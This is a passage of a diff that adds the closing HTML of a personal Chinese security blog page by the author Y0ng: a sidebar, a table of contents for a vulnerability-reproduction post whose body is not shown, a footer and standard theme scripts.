+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A7%E6%A6%82%E6%B5%81%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">大概流程</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
